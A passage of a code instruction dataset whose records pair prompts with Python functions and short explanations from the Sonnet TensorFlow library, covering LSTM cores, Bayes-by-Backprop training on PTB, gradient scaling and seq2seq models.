\"NHWC\". Specifies whether\n        the channel dimension of the input and output is the last dimension.\n        Default is `self._data_format`.\n      custom_getter: Callable or dictionary of callables to use as\n        custom getters inside the module. If a dictionary, the keys\n        correspond to regexes to match variable names. See the\n        `tf.get_variable` documentation for information about the\n        custom_getter API.\n\n    Returns:\n      Matching `ConvNet2D` module.\n\n    Raises:\n      ValueError: If output_channels is specified and its length does not match\n        the number of layers.\n    \"\"\"\n    if use_batch_norm is not None:\n      if normalization_ctor is not None or normalization_kwargs is not None:\n        raise ValueError(\n            \"If use_batch_norm is specified, normalization_ctor and \"\n            \"normalization_kwargs must not be.\")\n      if use_batch_norm:\n        normalization_ctor = batch_norm.BatchNorm\n      else:\n        normalization_ctor = None\n      normalization_kwargs = batch_norm_config\n\n    if custom_getter is None and self._custom_getter is not None:\n      tf.logging.warning(\n          \"This convnet was constructed with a custom getter, but the \"\n          \"`transpose` method was not given any. The transposed ConvNet will \"\n          \"not be using any custom_getter.\")\n\n    transpose_constructor = functools.partial(ConvNet2D,\n                                              custom_getter=custom_getter)\n\n    return self._transpose(\n        transpose_constructor=transpose_constructor,\n        name=name,\n        output_channels=output_channels,\n        kernel_shapes=kernel_shapes,\n        strides=strides,\n        paddings=paddings,\n        activation=activation,\n        activate_final=activate_final,\n        normalization_ctor=normalization_ctor,\n        normalization_kwargs=normalization_kwargs,\n        normalize_final=normalize_final,\n        initializers=initializers,\n        partitioners=partitioners,\n        regularizers=regularizers,\n        use_bias=use_bias,\n        data_format=data_format)"}
{"SOURCE": "codesearchnet", "instruction": "Create a Python 3 function to\nload the data or reads it from cache.", "response": "def _get_raw_data(subset):\n  \"\"\"Loads the data or reads it from cache.\"\"\"\n  raw_data = _LOADED.get(subset)\n  if raw_data is not None:\n    return raw_data, _LOADED[\"vocab\"]\n  else:\n    train_data, valid_data, test_data, vocab = ptb_reader.ptb_raw_data(\n        FLAGS.data_path)\n    _LOADED.update({\n        \"train\": np.array(train_data),\n        \"valid\": np.array(valid_data),\n        \"test\": np.array(test_data),\n        \"vocab\": vocab\n    })\n    return _LOADED[subset], vocab"}
{"SOURCE": "codesearchnet", "instruction": "Make a summary of the following Python 3 code\ndef custom_scale_mixture_prior_builder(getter, name, *args, **kwargs):\n  # This specific prior formulation doesn't need any of the arguments forwarded\n  # from `get_variable`.\n  del getter\n  del name\n  del args\n  del kwargs\n  return CustomScaleMixture(\n      FLAGS.prior_pi, FLAGS.prior_sigma1, FLAGS.prior_sigma2)", "response": "A custom scale - mixture prior of Fortunato et al."}
{"SOURCE": "codesearchnet", "instruction": "Given the following Python 3 function, write the documentation\ndef lstm_posterior_builder(getter, name, *args, **kwargs):\n  del args\n  parameter_shapes = tfp.distributions.Normal.param_static_shapes(\n      kwargs[\"shape\"])\n\n  # The standard deviation of the scale mixture prior.\n  prior_stddev = np.sqrt(\n      FLAGS.prior_pi * np.square(FLAGS.prior_sigma1) +\n      (1 - FLAGS.prior_pi) * np.square(FLAGS.prior_sigma2))\n\n  loc_var = getter(\n      \"{}/posterior_loc\".format(name),\n      shape=parameter_shapes[\"loc\"],\n      initializer=kwargs.get(\"initializer\"),\n      dtype=tf.float32)\n  scale_var = getter(\n      \"{}/posterior_scale\".format(name),\n      initializer=tf.random_uniform(\n          minval=np.log(np.exp(prior_stddev / 4.0) - 1.0),\n          maxval=np.log(np.exp(prior_stddev / 2.0) - 1.0),\n          dtype=tf.float32,\n          shape=parameter_shapes[\"scale\"]))\n  return tfp.distributions.Normal(\n      loc=loc_var,\n      scale=tf.nn.softplus(scale_var) + 1e-5,\n      name=\"{}/posterior_dist\".format(name))", "response": "A builder for a particular diagonal gaussian posterior."}
{"SOURCE": "codesearchnet", "instruction": "Here you have a function in Python 3, explain what it does\ndef build_modules(is_training, vocab_size):\n\n  # Construct the custom getter which implements Bayes by Backprop.\n  if is_training:\n    estimator_mode = tf.constant(bbb.EstimatorModes.sample)\n  else:\n    estimator_mode = tf.constant(bbb.EstimatorModes.mean)\n  lstm_bbb_custom_getter = bbb.bayes_by_backprop_getter(\n      posterior_builder=lstm_posterior_builder,\n      prior_builder=custom_scale_mixture_prior_builder,\n      kl_builder=bbb.stochastic_kl_builder,\n      sampling_mode_tensor=estimator_mode)\n  non_lstm_bbb_custom_getter = bbb.bayes_by_backprop_getter(\n      posterior_builder=non_lstm_posterior_builder,\n      prior_builder=custom_scale_mixture_prior_builder,\n      kl_builder=bbb.stochastic_kl_builder,\n      sampling_mode_tensor=estimator_mode)\n\n  embed_layer = snt.Embed(\n      vocab_size=vocab_size,\n      embed_dim=FLAGS.embedding_size,\n      custom_getter=non_lstm_bbb_custom_getter,\n      name=\"input_embedding\")\n\n  cores = []\n  for i in range(FLAGS.n_layers):\n    cores.append(\n        snt.LSTM(FLAGS.hidden_size,\n                 custom_getter=lstm_bbb_custom_getter,\n                 forget_bias=0.0,\n                 name=\"lstm_layer_{}\".format(i)))\n\n  rnn_core = snt.DeepRNN(\n      cores,\n      skip_connections=False,\n      name=\"deep_lstm_core\")\n\n  # Do BBB on weights but not biases of output layer.\n  output_linear = snt.Linear(\n      vocab_size, custom_getter={\"w\": non_lstm_bbb_custom_getter})\n  return embed_layer, rnn_core, output_linear", "response": "Construct the modules used in the graph."}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 script for\ncomputing the log loss given predictions and targets.", "response": "def build_loss(model_logits, sparse_targets):\n  \"\"\"Compute the log loss given predictions and targets.\"\"\"\n  time_major_shape = [FLAGS.unroll_steps, FLAGS.batch_size]\n  flat_batch_shape = [FLAGS.unroll_steps * FLAGS.batch_size, -1]\n  xent = tf.nn.sparse_softmax_cross_entropy_with_logits(\n      logits=tf.reshape(model_logits, flat_batch_shape),\n      labels=tf.reshape(sparse_targets, flat_batch_shape[:-1]))\n  xent = tf.reshape(xent, time_major_shape)\n  # Sum over the sequence.\n  sequence_neg_log_prob = tf.reduce_sum(xent, axis=0)\n  # Average over the batch.\n  return tf.reduce_mean(sequence_neg_log_prob, axis=0)"}
{"SOURCE": "codesearchnet", "instruction": "Can you implement a function in Python 3 that\nruns a PTB training set checkpointing the weights.", "response": "def train(logdir):\n  \"\"\"Run a network on the PTB training set, checkpointing the weights.\"\"\"\n\n  ptb_train = PTB(\n      name=\"ptb_train\",\n      subset=\"train\",\n      seq_len=FLAGS.unroll_steps,\n      batch_size=FLAGS.batch_size)\n\n  # Connect to training set.\n  data_ops = ptb_train()\n  embed_layer, rnn_core, output_linear = build_modules(\n      is_training=True, vocab_size=ptb_train.vocab_size)\n  prediction_logits, zero_state_op = build_logits(\n      data_ops, embed_layer, rnn_core, output_linear, name_prefix=\"train\")\n  data_loss = build_loss(prediction_logits, data_ops.sparse_target)\n\n  # Add the KL cost.\n  total_kl_cost = bbb.get_total_kl_cost()\n  num_dataset_elements = FLAGS.batch_size * ptb_train.num_batches\n  scaled_kl_cost = total_kl_cost / num_dataset_elements\n  total_loss = tf.add(scaled_kl_cost, data_loss)\n\n  # Optimize as usual.\n  global_step = tf.get_variable(\n      \"num_weight_updates\",\n      initializer=tf.constant(0, dtype=tf.int32, shape=()),\n      collections=[tf.GraphKeys.GLOBAL_VARIABLES, tf.GraphKeys.GLOBAL_STEP])\n\n  learning_rate = tf.get_variable(\n      \"lr\", initializer=tf.constant(FLAGS.lr_start, shape=(), dtype=tf.float32))\n  learning_rate_update = learning_rate.assign(learning_rate * FLAGS.lr_decay)\n  optimizer = tf.train.GradientDescentOptimizer(\n      learning_rate=learning_rate)\n  optimizer = GlobalNormClippingOptimizer(optimizer, clip_norm=5.0)\n\n  with tf.control_dependencies([optimizer.minimize(total_loss)]):\n    global_step_and_train = global_step.assign_add(1)\n\n  # Connect to valid set.\n  ptb_valid = PTB(\n      name=\"ptb_valid\",\n      subset=\"valid\",\n      seq_len=FLAGS.unroll_steps,\n      batch_size=FLAGS.batch_size)\n  valid_data_ops = ptb_valid()\n  valid_logits, zero_valid_state = build_logits(\n      valid_data_ops, embed_layer, rnn_core, output_linear, name_prefix=\"valid\")\n  valid_loss = build_loss(valid_logits, valid_data_ops.sparse_target)\n\n  # Compute metrics for the sake of monitoring training.\n  predictions = tf.cast(\n      tf.argmax(prediction_logits, axis=-1), tf.int32, name=\"pred\")\n  correct_prediction_mask = tf.cast(\n      tf.equal(predictions, data_ops.sparse_target), tf.int32)\n  accuracy = tf.reduce_mean(\n      tf.cast(correct_prediction_mask, tf.float32), name=\"acc\")\n  error_rate = tf.subtract(1.0, accuracy, name=\"err\")\n  label_probs = tf.nn.softmax(prediction_logits, dim=-1)\n  predictive_entropy = tf.reduce_mean(\n      label_probs * tf.log(label_probs + 1e-12) * -1.0)\n\n  # Create tf.summary ops.\n  log_ops_to_run = {\n      \"scalar\": collections.OrderedDict([\n          (\"task_loss\", data_loss),\n          (\"train_err_rate\", error_rate),\n          (\"pred_entropy\", predictive_entropy),\n          (\"learning_rate\", learning_rate),\n          (\"elbo_loss\", total_loss),\n          (\"kl_cost\", total_kl_cost),\n          (\"scaled_kl_cost\", scaled_kl_cost),\n      ]),\n      \"text\": collections.OrderedDict([\n          (\"labels\", ptb_train.to_string_tensor(data_ops.sparse_target)),\n          (\"predictions\", ptb_train.to_string_tensor(predictions))\n      ])\n  }\n\n  for name, tensor in log_ops_to_run[\"scalar\"].items():\n    tf.summary.scalar(os.path.join(\"train\", name), tensor)\n\n  # The remaining logic runs the training loop and logging.\n  summary_writer = tf.summary.FileWriterCache.get(logdir=logdir)\n  tf.logging.info(\n      \"Beginning training for {} epochs, each with {} batches.\".format(\n          FLAGS.num_training_epochs, ptb_train.num_batches))\n  with tf.train.MonitoredTrainingSession(\n      is_chief=True, checkpoint_dir=logdir, save_summaries_secs=10) as sess:\n    num_updates_v = _run_session_with_no_hooks(sess, global_step)\n    epoch_idx_start, step_idx_start = divmod(\n        num_updates_v, ptb_train.num_batches)\n    tf.logging.info(\"On start, epoch: {}\\t step: {}\".format(\n        epoch_idx_start, step_idx_start))\n    for epoch_idx in range(epoch_idx_start, FLAGS.num_training_epochs):\n      tf.logging.info(\"Beginning Epoch {}/{}\".format(\n          epoch_idx, FLAGS.num_training_epochs))\n      tf.logging.info(\n          (\"Beginning by evaluating on the validation set, which has \"\n           \"{} batches.\".format(ptb_valid.num_batches)))\n      valid_cost = 0\n      valid_steps = 0\n      _run_session_with_no_hooks(sess, zero_valid_state)\n      for _ in range(ptb_valid.num_batches):\n        valid_cost_v, num_updates_v = _run_session_with_no_hooks(\n            sess, [valid_loss, global_step])\n        valid_cost += valid_cost_v\n        valid_steps += FLAGS.unroll_steps\n      tf.logging.info(\"Validation set perplexity: {}\".format(\n          np.exp(valid_cost / valid_steps)))\n      summary = tf.summary.Summary()\n      summary.value.add(\n          tag=\"valid/word_level_perplexity\",\n          simple_value=np.exp(valid_cost / valid_steps))\n      summary_writer.add_summary(summary, num_updates_v)\n\n      # Run a training epoch.\n      epoch_cost = 0\n      epoch_steps = 0\n      for batch_idx in range(step_idx_start, ptb_train.num_batches):\n        scalars_res, num_updates_v = sess.run(\n            [log_ops_to_run[\"scalar\"], global_step_and_train])\n        epoch_cost += scalars_res[\"task_loss\"]\n        epoch_steps += FLAGS.unroll_steps\n        if (batch_idx - 1) % FLAGS.print_every_batches == 0:\n          summary = tf.summary.Summary()\n          summary.value.add(\n              tag=\"train/word_level_perplexity\",\n              simple_value=np.exp(epoch_cost / epoch_steps))\n          summary_writer.add_summary(summary, num_updates_v)\n          scalars_res, strings_res = _run_session_with_no_hooks(\n              sess, [log_ops_to_run[\"scalar\"], log_ops_to_run[\"text\"]])\n          tf.logging.info(\"Num weight updates: {}\".format(num_updates_v))\n          for name, result in scalars_res.items():\n            tf.logging.info(\"{}: {}\".format(name, result))\n          for name, result in strings_res.items():\n            tf.logging.info(\"{}: {}\".format(name, result))\n\n      word_level_perplexity = np.exp(epoch_cost / epoch_steps)\n      tf.logging.info(\n          \"Train Perplexity after Epoch {}: {}\".format(\n              epoch_idx, word_level_perplexity))\n\n      end_of_epoch_fetches = [zero_state_op]\n      if epoch_idx >= FLAGS.high_lr_epochs:\n        end_of_epoch_fetches.append(learning_rate_update)\n      _run_session_with_no_hooks(sess, end_of_epoch_fetches)\n\n  tf.logging.info(\"Done training. Thanks for your time.\")"}
{"SOURCE": "codesearchnet", "instruction": "How would you explain what the following Python 3 function does\ndef _ensure_dependency_available_at_version(package_name, min_version):\n\n  try:\n    pkg = importlib.import_module(package_name)\n  except ImportError:\n    pip_name = package_name.replace('_', '-')\n    raise SystemError(\n        'Sonnet requires %s (minimum version %s) to be installed. '\n        'If using pip, run `pip install %s` or '\n        '`pip install %s-gpu`' % (\n            package_name, min_version, pip_name, pip_name))\n\n  installed_version = semantic_version.Version(pkg.__version__)\n  version_spec = semantic_version.Spec('>=' + min_version)\n  if not version_spec.match(installed_version):\n    raise SystemError(\n        '%s version %s is installed, but Sonnet requires at least version %s.' %\n        (package_name, pkg.__version__, min_version))", "response": "Throw helpful error if required dependencies not available at the given version."}
{"SOURCE": "codesearchnet", "instruction": "Implement a function in Python 3 to\ncreate an op that scales gradients using a Defun.", "response": "def _scale_gradient_op(dtype):\n  \"\"\"Create an op that scales gradients using a Defun.\n\n  The tensorflow Defun decorator creates an op and tensorflow caches these ops\n  automatically according to `func_name`. Using a Defun decorator twice with the\n  same `func_name` does not create a new op, instead the cached op is used.\n\n  This method produces a new op the first time it is called with a given `dtype`\n  argument, and then uses the cached op each time it is called after that with\n  the same `dtype`. The scale value is given as an argument for the forward pass\n  method so that it can be used in the backwards pass.\n\n  Args:\n    dtype: the dtype of the net whose gradient is being scaled.\n\n  Returns:\n    The op that scales gradients.\n  \"\"\"\n\n  def scale_gradient_backward(op, grad):\n    scale = op.inputs[1]\n    scaled_grad = grad * scale\n    return scaled_grad, None\n\n  # Note that if the forward pass implementation involved the creation of ops,\n  # _scale_gradient_op would require some memoization mechanism.\n  def scale_gradient_forward(x, scale):\n    del scale  # Unused.\n    return x\n\n  func_name = \"ScaleGradient_{}\".format(dtype.name)\n  return function.Defun(\n      dtype, dtype,\n      python_grad_func=scale_gradient_backward,\n      func_name=func_name)(scale_gradient_forward)"}
{"SOURCE": "codesearchnet", "instruction": "How would you implement a function in Python 3 that\nscales gradients on the backwards pass.", "response": "def scale_gradient(net, scale, name=\"scale_gradient\"):\n  \"\"\"Scales gradients for the backwards pass.\n\n  This might be used to, for example, allow one part of a model to learn at a\n  lower rate than the rest.\n\n  WARNING: Think carefully about how your optimizer works. If, for example, you\n  use rmsprop, the gradient is always rescaled (with some additional epsilon)\n  towards unity. This means `scale_gradient` won't have the effect of\n  lowering the learning rate.\n\n  If `scale` is `0.0`, this op reduces to `tf.stop_gradient`. If `scale`\n  is `1.0`, this op reduces to `tf.identity`.\n\n  Args:\n    net: A `tf.Tensor` or in eager mode a callable that produces a `tf.Tensor`.\n    scale: The scale factor for the gradient on the backwards pass.\n    name: A name for the operation (optional).\n\n  Returns:\n    In graph mode returns a `tf.Tensor` with the same type as the input tensor.\n    In eager mode returns a callable wrapping `net` whose gradients are scaled.\n\n  Raises:\n    ValueError: If `net` dtype is non-float and `scale` is not zero or one.\n  \"\"\"\n  if tf.executing_eagerly():\n    if not callable(net):\n      raise ValueError(\n          \"In eager mode `net` must be a callable (similar to how optimizers \"\n          \"must be used when executing eagerly).\")\n    return tfe.defun(lambda *a, **k: scale_gradient(net(*a, **k), scale, name))\n\n  if scale == 0.0:\n    return tf.stop_gradient(net, name=name)\n  elif scale == 1.0:\n    return tf.identity(net, name=name)\n  else:\n    if not net.dtype.is_floating:\n      raise ValueError(\"clip_gradient does not support non-float `net` inputs.\")\n\n    with tf.name_scope(name, \"scale_gradient\", values=[net]):\n      dtype = net.dtype.base_dtype  # Convert ref dtypes to regular dtypes.\n      scale_tensor = tf.convert_to_tensor(scale, dtype=dtype)\n\n      scale_gradient_op = _scale_gradient_op(dtype)\n      output = scale_gradient_op(net, scale_tensor)\n      output.set_shape(net.get_shape())\n\n    return output"}
{"SOURCE": "codesearchnet", "instruction": "Can you generate a brief explanation for the following Python 3 code\ndef build_and_train(iterations, log_stride, test=False):\n\n  # Test mode settings.\n  batch_size = 2 if test else FLAGS.batch_size\n  num_mems = 2 if test else FLAGS.num_mems\n  num_heads = 1 if test else FLAGS.num_mems\n  num_blocks = 1 if test else FLAGS.num_mems\n  head_size = 4 if test else FLAGS.head_size\n  max_length = 3 if test else FLAGS.max_length\n  max_nest = 2 if test else FLAGS.max_nest\n  mlp_size = (20,) if test else (256, 256, 256, 256)\n\n  with tf.Graph().as_default():\n    t0 = time.time()\n\n    # Initialize the dataset.\n    lte_train = learn_to_execute.LearnToExecute(\n        batch_size, max_length, max_nest)\n    lte_test = learn_to_execute.LearnToExecute(\n        batch_size, max_length, max_nest, mode=learn_to_execute.Mode.TEST)\n    train_data_iter = lte_train.make_one_shot_iterator().get_next()\n    test_data_iter = lte_test.make_one_shot_iterator().get_next()\n    output_size = lte_train.state.vocab_size\n\n    # Create the model.\n    core = snt.RelationalMemory(\n        mem_slots=num_mems,\n        head_size=head_size,\n        num_heads=num_heads,\n        num_blocks=num_blocks,\n        gate_style=FLAGS.gate_style)\n    final_mlp = snt.nets.MLP(\n        output_sizes=mlp_size,\n        activate_final=True)\n    model = SequenceModel(\n        core=core,\n        target_size=output_size,\n        final_mlp=final_mlp)\n    tf.logging.info(\"Instantiated models ({:3f})\".format(time.time() - t0))\n\n    # Define the loss & accuracy.\n    def loss_fn(inputs, targets, input_sequence_length, output_sequence_length):\n      \"\"\"Creates the loss and the exports.\"\"\"\n      logits = model(\n          inputs, targets, input_sequence_length, output_sequence_length)\n      targets = tf.cast(targets, tf.int32)\n      sq_sz_out_max = targets.shape[0].value\n\n      # Create a mask to ignore accuracy on buffer characters.\n      sequence_sizes = tf.cast(output_sequence_length, tf.float32)\n      lengths_transposed = tf.expand_dims(sequence_sizes, 1)\n      range_row = tf.expand_dims(\n          tf.range(0, sq_sz_out_max, 1, dtype=tf.float32), 0)\n      mask = tf.cast(tf.transpose(tf.less(range_row, lengths_transposed)),\n                     tf.float32)\n\n      # Compute token accuracy and solved.\n      correct = tf.equal(tf.argmax(logits, 2), tf.argmax(targets, 2))\n      solved = tf.reduce_all(tf.boolean_mask(correct, tf.squeeze(mask)), axis=0)\n      token_acc = tf.reduce_sum(tf.cast(correct, tf.float32) * mask)\n      token_acc /= tf.reduce_sum(sequence_sizes)\n\n      # Compute Loss.\n      mask = tf.cast(tf.tile(tf.expand_dims(mask, 2), (1, 1, logits.shape[2])),\n                     tf.float32)\n      masked_logits = logits * mask\n      masked_target = tf.cast(targets, tf.float32) * mask\n      logits_flat = tf.reshape(masked_logits,\n                               [sq_sz_out_max * batch_size, -1])\n      target_flat = tf.reshape(masked_target,\n                               [sq_sz_out_max * batch_size, -1])\n      xent = tf.nn.softmax_cross_entropy_with_logits(logits=logits_flat,\n                                                     labels=target_flat)\n      loss = tf.reduce_mean(xent)\n      return loss, token_acc, solved\n\n    # Get training step counter.\n    global_step = tf.train.get_or_create_global_step()\n\n    # Create the optimizer.\n    learning_rate_op = tf.reduce_max([\n        tf.train.exponential_decay(\n            FLAGS.learning_rate,\n            global_step,\n            decay_steps=FLAGS.epochs // 100,\n            decay_rate=0.9,\n            staircase=False),\n        FLAGS.min_learning_rate\n    ])\n    optimizer = tf.train.AdamOptimizer(learning_rate_op)\n\n    # Compute loss, accuracy & the step op.\n    inputs, targets, _, input_lengths, output_lengths = train_data_iter\n    train_loss, train_acc, train_sol = loss_fn(\n        inputs, targets, input_lengths, output_lengths)\n    step_op = optimizer.minimize(train_loss, global_step=global_step)\n    inputs, targets, _, input_lengths, output_lengths = test_data_iter\n    _, test_acc, test_sol = loss_fn(\n        inputs, targets, input_lengths, output_lengths)\n    tf.logging.info(\"Created losses and optimizers ({:3f})\".format(\n        time.time() - t0))\n\n    # Begin Training.\n    t0 = time.time()\n    tf.logging.info(\"Starting training ({:3f})\".format(time.time() - t0))\n    with tf.train.SingularMonitoredSession() as sess:\n      for it in six.moves.range(iterations):\n        sess.run([step_op, learning_rate_op])\n        if it % log_stride == 0:\n          loss_v, train_acc_v, test_acc_v, train_sol_v, test_sol_v = sess.run([\n              train_loss, train_acc, test_acc, train_sol, test_sol])\n          elapsed = time.time() - t0\n          tf.logging.info(\n              \"iter: {:2d}, train loss {:3f}; train acc {:3f}; test acc {:3f};\"\n              \" train solved {:3f}; test solved {:3f}; ({:3f})\".format(\n                  it, loss_v, train_acc_v, test_acc_v, train_sol_v, test_sol_v,\n                  elapsed))", "response": "Construct the data model loss and optimizer then train."}
{"SOURCE": "codesearchnet", "instruction": "Implement a function in Python 3 to\nbuild the seq2seq model.", "response": "def _build(\n      self, inputs, targets, input_sequence_length, output_sequence_length):\n    \"\"\"Dynamic unroll across input objects.\n\n    Args:\n      inputs: tensor (input_sequence_length x batch x feature_size). Encoder\n          sequence.\n      targets: tensor (output_sequence_length x batch x feature_size). Decoder\n          sequence.\n      input_sequence_length: tensor (batch). Size of each batched input\n          sequence.\n      output_sequence_length: tensor (batch). Size of each batched target\n          sequence.\n\n    Returns:\n      Tensor (batch x num_objects); logits indicating the reference objects.\n    \"\"\"\n    # Connect decoding steps.\n    batch_size = inputs.get_shape()[1]\n    initial_state = self._core.initial_state(batch_size, trainable=False)\n    _, state = tf.nn.dynamic_rnn(\n        cell=self._core,\n        inputs=inputs,\n        sequence_length=input_sequence_length,\n        time_major=True,\n        initial_state=initial_state\n    )\n    # Connect decoding steps.\n    zero_input = tf.zeros(shape=targets.get_shape())\n    output_sequence, _ = tf.nn.dynamic_rnn(\n        cell=self._core,\n        inputs=zero_input,  # Non-autoregressive model.  Zeroed input.\n        sequence_length=output_sequence_length,\n        initial_state=state,\n        time_major=True)\n    outputs = snt.BatchApply(self._final_mlp)(output_sequence)\n    logits = snt.BatchApply(snt.Linear(self._target_size))(outputs)\n    tf.logging.info(\"Connected seq2seq model.\")\n    return logits"}
{"SOURCE": "codesearchnet", "instruction": "Explain what the following Python 3 code does\ndef lstm_with_recurrent_dropout(hidden_size, keep_prob=0.5, **kwargs):\n\n  lstm = LSTM(hidden_size, **kwargs)\n  return RecurrentDropoutWrapper(lstm, LSTMState(keep_prob, None)), lstm", "response": "Returns a new LSTM with recurrent dropout enabled."}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 script for\nreturning a new LSTM with recurrent dropout enabled for training and test LSTM.", "response": "def lstm_with_zoneout(hidden_size, keep_prob_c=0.5, keep_prob_h=0.95, **kwargs):\n  \"\"\"LSTM with recurrent dropout.\n\n  Args:\n    hidden_size: the LSTM hidden size.\n    keep_prob_c: the probability to use the new value of the cell state rather\n      than freezing it.\n    keep_prob_h: the probability to use the new value of the hidden state\n      rather than freezing it.\n    **kwargs: Extra keyword arguments to pass to the LSTM.\n\n  Returns:\n    A tuple (train_lstm, test_lstm) where train_lstm is an LSTM with\n    recurrent dropout enabled to be used for training and test_lstm\n    is the same LSTM without zoneout.\n  \"\"\"\n\n  lstm = LSTM(hidden_size, **kwargs)\n  keep_probs = LSTMState(keep_prob_h, keep_prob_c)\n  train_lstm = ZoneoutWrapper(lstm, keep_probs, is_training=True)\n  test_lstm = ZoneoutWrapper(lstm, keep_probs, is_training=False)\n  return train_lstm, test_lstm"}
{"SOURCE": "codesearchnet", "instruction": "Here you have a function in Python 3, explain what it does\ndef highway_core_with_recurrent_dropout(\n    hidden_size,\n    num_layers,\n    keep_prob=0.5,\n    **kwargs):\n  \"\"\"Highway core with recurrent dropout.\n\n  Args:\n    hidden_size: (int) Hidden size dimensionality.\n    num_layers: (int) Number of highway layers.\n    keep_prob: the probability to keep an entry when applying dropout.\n    **kwargs: Extra keyword arguments to pass to the highway core.\n\n  Returns:\n    A tuple (train_core, test_core) where train_core is a higway core with\n    recurrent dropout enabled to be used for training and test_core is the\n    same highway core without recurrent dropout.\n  \"\"\"\n\n  core = HighwayCore(hidden_size, num_layers, **kwargs)\n  return RecurrentDropoutWrapper(core, keep_prob), core", "response": "Highway core with recurrent dropout."}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 script to\nreturn the set of possible variable initializers that may be used for the given class.", "response": "def get_possible_initializer_keys(cls, use_peepholes=False,\n                                    use_projection=False):\n    \"\"\"Returns the keys the dictionary of variable initializers may contain.\n\n    The set of all possible initializer keys are:\n      w_gates:  weight for gates\n      b_gates:  bias of gates\n      w_f_diag: weight for prev_cell -> forget gate peephole\n      w_i_diag: weight for prev_cell -> input gate peephole\n      w_o_diag: weight for prev_cell -> output gate peephole\n\n    Args:\n      cls:The class.\n      use_peepholes: Boolean that indicates whether peephole connections are\n        used.\n      use_projection: Boolean that indicates whether a recurrent projection\n        layer is used.\n\n    Returns:\n      Set with strings corresponding to the strings that may be passed to the\n        constructor.\n    \"\"\"\n\n    possible_keys = cls.POSSIBLE_INITIALIZER_KEYS.copy()\n    if not use_peepholes:\n      possible_keys.difference_update(\n          {cls.W_F_DIAG, cls.W_I_DIAG, cls.W_O_DIAG})\n    if not use_projection:\n      possible_keys.difference_update({cls.W_H_PROJECTION})\n    return possible_keys"}
{"SOURCE": "codesearchnet", "instruction": "Can you tell what is the following Python 3 function doing\ndef _build(self, inputs, prev_state):\n    prev_hidden, prev_cell = prev_state\n\n    # pylint: disable=invalid-unary-operand-type\n    if self._hidden_clip_value is not None:\n      prev_hidden = tf.clip_by_value(\n          prev_hidden, -self._hidden_clip_value, self._hidden_clip_value)\n    if self._cell_clip_value is not None:\n      prev_cell = tf.clip_by_value(\n          prev_cell, -self._cell_clip_value, self._cell_clip_value)\n    # pylint: enable=invalid-unary-operand-type\n\n    self._create_gate_variables(inputs.get_shape(), inputs.dtype)\n\n    # pylint false positive: calling module of same file;\n    # pylint: disable=not-callable\n\n    # Parameters of gates are concatenated into one multiply for efficiency.\n    inputs_and_hidden = tf.concat([inputs, prev_hidden], 1)\n    gates = tf.matmul(inputs_and_hidden, self._w_xh)\n\n    if self._use_layer_norm:\n      gates = layer_norm.LayerNorm()(gates)\n\n    gates += self._b\n\n    # i = input_gate, j = next_input, f = forget_gate, o = output_gate\n    i, j, f, o = tf.split(value=gates, num_or_size_splits=4, axis=1)\n\n    if self._use_peepholes:  # diagonal connections\n      self._create_peephole_variables(inputs.dtype)\n      f += self._w_f_diag * prev_cell\n      i += self._w_i_diag * prev_cell\n\n    forget_mask = tf.sigmoid(f + self._forget_bias)\n    next_cell = forget_mask * prev_cell + tf.sigmoid(i) * tf.tanh(j)\n    cell_output = next_cell\n    if self._use_peepholes:\n      cell_output += self._w_o_diag * cell_output\n    next_hidden = tf.tanh(cell_output) * tf.sigmoid(o)\n\n    if self._use_projection:\n      next_hidden = tf.matmul(next_hidden, self._w_h_projection)\n\n    return next_hidden, LSTMState(hidden=next_hidden, cell=next_cell)", "response": "Connects the LSTM module into the graph."}
{"SOURCE": "codesearchnet", "instruction": "How would you explain what the following Python 3 function does\ndef _create_gate_variables(self, input_shape, dtype):\n    if len(input_shape) != 2:\n      raise ValueError(\n          \"Rank of shape must be {} not: {}\".format(2, len(input_shape)))\n\n    equiv_input_size = self._hidden_state_size + input_shape.dims[1].value\n    initializer = basic.create_linear_initializer(equiv_input_size)\n\n    self._w_xh = tf.get_variable(\n        self.W_GATES,\n        shape=[equiv_input_size, 4 * self._hidden_size],\n        dtype=dtype,\n        initializer=self._initializers.get(self.W_GATES, initializer),\n        partitioner=self._partitioners.get(self.W_GATES),\n        regularizer=self._regularizers.get(self.W_GATES))\n    self._b = tf.get_variable(\n        self.B_GATES,\n        shape=[4 * self._hidden_size],\n        dtype=dtype,\n        initializer=self._initializers.get(self.B_GATES, initializer),\n        partitioner=self._partitioners.get(self.B_GATES),\n        regularizer=self._regularizers.get(self.B_GATES))\n    if self._use_projection:\n      w_h_initializer = basic.create_linear_initializer(self._hidden_size)\n      self._w_h_projection = tf.get_variable(\n          self.W_H_PROJECTION,\n          shape=[self._hidden_size, self._hidden_state_size],\n          dtype=dtype,\n          initializer=self._initializers.get(self.W_H_PROJECTION,\n                                             w_h_initializer),\n          partitioner=self._partitioners.get(self.W_H_PROJECTION),\n          regularizer=self._regularizers.get(self.W_H_PROJECTION))", "response": "Initialize the variables used for the gates."}
{"SOURCE": "codesearchnet", "instruction": "Here you have a function in Python 3, explain what it does\ndef _create_peephole_variables(self, dtype):\n    self._w_f_diag = tf.get_variable(\n        self.W_F_DIAG,\n        shape=[self._hidden_size],\n        dtype=dtype,\n        initializer=self._initializers.get(self.W_F_DIAG),\n        partitioner=self._partitioners.get(self.W_F_DIAG),\n        regularizer=self._regularizers.get(self.W_F_DIAG))\n    self._w_i_diag = tf.get_variable(\n        self.W_I_DIAG,\n        shape=[self._hidden_size],\n        dtype=dtype,\n        initializer=self._initializers.get(self.W_I_DIAG),\n        partitioner=self._partitioners.get(self.W_I_DIAG),\n        regularizer=self._regularizers.get(self.W_I_DIAG))\n    self._w_o_diag = tf.get_variable(\n        self.W_O_DIAG,\n        shape=[self._hidden_size],\n        dtype=dtype,\n        initializer=self._initializers.get(self.W_O_DIAG),\n        partitioner=self._partitioners.get(self.W_O_DIAG),\n        regularizer=self._regularizers.get(self.W_O_DIAG))", "response": "Initialize the variables used for the peephole connections."}
